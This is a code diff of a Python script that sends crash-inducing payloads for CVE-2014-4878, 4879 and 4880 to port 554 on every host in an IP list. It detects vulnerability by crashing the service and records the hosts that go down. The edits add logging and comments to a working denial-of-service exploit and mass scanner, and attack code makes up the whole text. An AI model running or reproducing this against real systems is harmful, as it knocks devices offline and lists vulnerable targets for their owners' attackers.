@@ -28,13 +28,13 @@ def cve20144880(host):
 	payload += 'B' * 1024
 	return payload
 
-def check_vul(host, payload):
+def check_vuln(host, payload):
 	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	soc.connect((host, 554))
 	soc.send(payload)
 	soc.close()
 
-	sleep(0.2)
+	sleep(0.2)  # sleep to wait server crash
 	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
 		soc.connect((host, 554))
@@ -48,20 +48,25 @@ def check_vul(host, payload):
 ip_file = open('ip.txt', "r")
 vul_ip = open('vul_ip.txt', "w")
 
-for host in ip_file:
+for host_ip in ip_file:
+	host = host_ip.replace('\n', '')
+	print("Testing " + host)
 	payload = cve20144878(host)
-	if check_vul(host, payload):
-		vul_ip.write(host)
+	if check_vuln(host, payload):
+		vul_ip.write(host+'\n')
+		print(host + " is vulnerable in cve20144878")
 		continue
 
 	payload = cve20144879(host)
-	if check_vul(host, payload):
-		vul_ip.write(host)
+	if check_vuln(host, payload):
+		vul_ip.write(host+'\n')
+		print(host + " is vulnerable in cve20144879")
 		continue
 
 	payload = cve20144880(host)
-	if check_vul(host, payload):
-		vul_ip.write(host)
+	if check_vuln(host, payload):
+		vul_ip.write(host+'\n')
+		print(host + " is vulnerable in cve20144880")
 		continue
 ip_file.close()
 vul_ip.close()
